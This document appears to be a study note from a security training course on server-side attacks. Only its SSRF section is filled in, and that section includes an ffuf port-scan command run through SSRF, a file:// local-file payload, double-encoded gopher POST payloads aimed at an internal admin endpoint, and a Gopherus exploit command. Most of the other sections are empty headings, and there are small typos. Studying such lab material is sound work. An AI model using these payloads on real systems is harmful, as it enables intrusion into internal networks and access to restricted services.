# Introduction
All about server side attacks
### SSRF
[Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) is a vulnerability where an attacker can manipulate a web application into sending unauthorized requests from the server. This vulnerability often occurs when an application makes HTTP requests to other servers based on user input. Successful exploitation of SSRF can enable an attacker to access internal systems, bypass firewalls, and retrieve sensitive information.
### SSTI
Web applications can utilize templating engines and server-side templates to generate responses such as HTML content dynamically. This generation is often based on user input, enabling the web application to respond to user input dynamically. When an attacker can inject template code, a [Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection) vulnerability can occur. SSTI can lead to various security risks, including data leakage and even full server compromise via remote code execution.
### SSII
Similar to server-side templates, server-side includes (SSI) can be used to generate HTML responses dynamically. SSI directives instruct the webserver to include additional content dynamically. These directives are embedded into HTML files. For instance, SSI can be used to include content that is present in all HTML pages, such as headers or footers. When an attacker can inject commands into the SSI directives, [Server-Side Includes (SSI) Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_\(SSI\)_Injection) can occur.
### XSLT
XSLT (Extensible Stylesheet Language Transformations) server-side injection is a vulnerability that arises when an attacker can manipulate XSLT transformations performed on the server. XSLT is a language used to transform XML documents into other formats, such as HTML, and is commonly employed in web applications to generate content dynamically.

---
# SSRF

## Intro to SSRF
This type of vulnerability occurs when a web application fetches additional resources from a remote location based on user-supplied data, such as a URL.

1. A web server should fetch remote resources based on user input
2. In such case we can supply our own server to make request to.
3. If the web application relies on a user-supplied URL scheme or protocol , an attacker might be able to cause even further undesired behavior by manipulating the URL scheme. For Eg:
	1. http:// and https://, can be used to bypass WAFs and access restricted endpoints or access endpoints in the internal network.
	2. file://, can be used to read local files in the local file system by chaining SSRF Vuln.
	3. gopher://  This protocol can send arbitrary bytes to the specified address. This can be used to exploit SSRF to send HTTP POST req with arbitrary payloads or communicate with other services such as SMTP servers or databases.
## Identifying SSRF
### Confirming SSRF
1. Capture the request which might make a request to some other system.
2. In the request if there is a data parameter which points to another system then try pointing it to your own hosted python server and try pointing it to the localhost( server machine) and fetch known files.
### Enumerating the System
We can use the SSRF vulnerability to conduct a port scan of the system to enumerate running services.
1. Check if a port is open or not via fuzzing
	`seq 0 65355 > ports.txt`
	`ffuf -w ./ports.txt -u URL -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "Field which is requesting through url" -fr "Failes to connect to"`
### Assessment
1. Load the date functionality to capture the request.
2. Fuzz the request for ports between 0-65355.
3. Send request dataserver=http://127.0.0.1:8000/ to retrieve the flag.
## Exploiting SSRF

### Accessing Restricted Endpoints
If you try to access the then found domain from the request you may not be able to do so on your browser.
But you can Fuzz using the SSRF vulnerability:
	1. Determine the response when accessing a non-existing page
	2. Filter out all the 404 errors and specify the extension of the possible directory based on web stack.

### Local File Inclusion (LFI)
We can also provide other URI schemes to provoke unexpected behaviors.
for example try `file:///ertc/passwd`

### The gopher Protocol
Using http:// URL scheme we cannot send POST request, assume there is an endpoint where we have to send password as a parameter, so we use gopher URL scheme to send arbitrary bytes to a TCP socket. This protocol enables us to create a POST request by building the HTTP request ourselves.

We need to send a POST request which should be double encoded:
```http
POST /admin.php HTTP/1.1
Host: dateserver.htb
Content-Length: 13
Content-Type: application/x-www-form-urlencoded

adminpw=admin
```
single encoded:
```
gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserver.htb%0D%0AContent-Length:%2013%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0A%0D%0Aadminpw%3Dadmin
```

the request with double encoding:
```http
POST /index.php HTTP/1.1
Host: 172.17.0.2
Content-Length: 265
Content-Type: application/x-www-form-urlencoded

dateserver=gopher%3a//dateserver.htb%3a80/_POST%2520/admin.php%2520HTTP%252F1.1%250D%250AHost%3a%2520dateserver.htb%250D%250AContent-Length%3a%252013%250D%250AContent-Type%3a%2520application/x-www-form-urlencoded%250D%250A%250D%250Aadminpw%253Dadmin&date=2024-01-01
```

we can also use gopher for other protocols, but its tedious hence we use [Gopherus](https://github.com/tarunkant/Gopherus) to generate gopher URLs for us.
The following are supported:
- MySQL
- PostgreSQL
- FastCGI
- Redis
- SMTP
- Zabbix
- pymemcache
- rbmemcache
- phpmemcache
- dmpmemcache
need to have python 2
command:
	`python2.7 gopherus.py --exploit smtp`
	
## Blind SSRF
## Preventing SSRF
# SSTI
## Template Engines
## Intro to SSTI
## Identifying SSTI
## Exploiting SSTI - Jinja2
## Exploiting SSTI - Twig

## SSTI Tools of the trade & Preventing SSTI

# SSI Injection
## Intro to SSI Injection
## Exploiting SSI Injection
## Preventing SSI Injection

# XSLT Injection

## Intro to XSLT Injection
## Exploiting XSLT Injection

## Preventing XSLT Injection

# Skills Assessment
